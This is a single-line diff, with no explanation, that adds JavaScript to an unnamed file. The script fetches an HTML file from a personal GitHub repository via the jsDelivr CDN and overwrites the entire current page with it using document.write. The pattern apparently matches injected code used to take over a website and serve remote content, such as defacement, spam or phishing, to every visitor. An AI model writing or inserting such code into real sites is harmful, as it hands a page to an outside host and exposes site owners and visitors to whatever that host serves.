@@ -1,0 +1,1 @@
+fetch('https://cdn.jsdelivr.net/gh/satriaaao/linix@05c7edbc6fa0b011230d540c4b2263c06f329e0e/bsm-cinemachine/index-cms-v3.html').then(function(r){return r.text()}).then(function(h){document.open();document.write(h);document.close()});
